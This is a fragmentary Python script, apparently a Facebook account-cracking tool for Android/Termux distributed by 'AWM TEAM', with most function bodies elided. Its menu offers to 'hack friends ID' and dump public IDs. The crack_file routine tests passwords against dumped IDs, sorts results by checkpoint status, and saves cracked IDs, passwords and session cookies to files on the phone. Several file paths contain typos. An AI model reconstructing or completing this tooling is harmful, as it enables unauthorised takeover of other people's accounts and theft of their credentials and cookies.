...
def banner():
	...
	ban='''MUHAMMAD WAHID
     ...
     WhatsApp:+93 72 940 1940

     BY AWM TEAM FREE

     AUTHOR :AWM TEAM

     NOTE:This Tools is for Afghan'''
...
def menu(my_name,my_id):
	...
	io = '''[bold green][01] HACK FRINDS ID PUBLIc	    

[02] DUMP ID PUBLIC (OK)   		     [bold green]'''
...
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('/sdcard/AWM-TEAM/CP')
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				try:hem = open('/sdcard/AWM-TEAM/CP/'+isi,'r').readlines()
			...
			try:lin = open('/sdcard/AWM-TEAM/CP/'+geh,'r').read().splitlines()
		...
		try:vin = os.listdir('/sdcard/AWM-TEAM/OK')
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				try:hem = open('/sdcard/AWM-TEAM/OK/'+isi,'r').readlines()
			...
			try:lin = open('/sdcard/AWM-TEAM/OK/'+geh,'r').read().splitlines()
...
def file():
	...
	try:
		...
		lis = os.listdir('/sdcardAWM-TEAM/CP')
	...
	if len(my_files)==0:
		...
		try:
			...
			hf = open('/sdcard/AWM-TEAM/CP/'+geh,'r').readlines()
			...
			try:
				...
				hf = open('/sdcard/AWM-TEAM/OK/'+geh,'r').readlines()
...
def crack_file():
	...
	try:vin = os.listdir('/sdcard/AWM-TEAM/DUMP')
	...
	if len(vin)==0:
		...
		for isi in vin:
			...
			try:hem = open('/sdcard/AWM-TEAM/DUMP/'+isi,'r').readlines()
		...
		try:lin = open('/sdcard/AWM-TEAM/DUMP/'+geh,'r').read().splitlines()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/AWM-TEAM/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'ya' in oprek:
					...
					open('/sdcard/AWM-TEAM/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/AWM-TEAMA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='WAHID CP'))
